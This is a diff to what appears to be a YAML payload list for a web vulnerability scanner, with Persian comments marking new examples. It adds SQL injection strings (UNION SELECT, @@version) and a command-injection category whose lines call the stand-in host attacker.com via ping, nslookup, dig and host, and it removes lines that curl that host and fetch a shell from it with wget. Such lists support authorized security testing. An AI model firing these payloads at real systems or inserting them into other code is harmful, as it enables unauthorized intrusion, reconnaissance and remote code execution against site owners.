@@ -27,6 +27,9 @@ payloads:
           - "' OR 1=1 LIMIT 1--"
           - "' OR 1=1 ORDER BY 1--"
           - "' OR 1=1 GROUP BY 1--"
+          # مثال: اضافه کردن Payload جدید
+          - "' OR 1=1 UNION SELECT 1,2,3--"
+          - "' OR 1=1 UNION SELECT @@version,2,3--"
       
       advanced:
         description: "Advanced SQL injection techniques"
@@ -198,10 +201,15 @@ payloads:
           - "; systeminfo"
           - "& ipconfig"
           - "| tasklist"
+      
+      # مثال: اضافه کردن دسته‌بندی جدید
+      custom_commands:
+        description: "Custom command injection payloads"
+        payloads:
           - "; ping -c 1 attacker.com"
           - "| nslookup attacker.com"
-          - "; curl http://attacker.com"
-          - "| wget -qO- http://attacker.com/shell"
+          - "; dig attacker.com"
+          - "| host attacker.com"
 
   ssrf:
     name: "Server-Side Request Forgery (SSRF)"
